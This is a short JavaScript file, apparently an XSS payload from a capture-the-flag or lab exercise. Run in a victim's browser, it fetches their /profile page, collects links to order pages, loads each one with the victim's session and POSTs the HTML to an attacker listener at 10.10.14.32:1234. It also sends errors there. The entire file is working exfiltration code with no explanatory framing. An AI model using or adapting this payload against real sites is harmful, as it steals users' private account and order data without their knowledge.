const IP = "10.10.14.32";
const PORT = 1234;

async function sendResponse(resp) {
    fetch(`http://${IP}:${PORT}`, {method: "POST", body: resp});
}

async function getPage(uri) {
    var url = `http://${window.location.host}${uri}`;
    response = await fetch(url);
    return response.text();
}

async function parseOrders(html) {
    ordersUri = [];
    var profile = document.createElement("html");
    profile.innerHTML = html
    var profileLinks = profile.getElementsByTagName("a");

    for(linkTag of profileLinks) {
        if(!linkTag.href.includes('order')) {
            continue;
        }
        var orderUri = linkTag.getAttribute("href", 2);
        ordersUri.push(orderUri);
    }
    return ordersUri;
}

async function main() {
    var profile = await getPage("/profile");
    var orders = await parseOrders(profile);
    for(order of orders) {
        var html = await getPage(order);
        sendResponse(html);
    }
}

try {
    main();
} catch(err) {
    sendResponse(err);
}
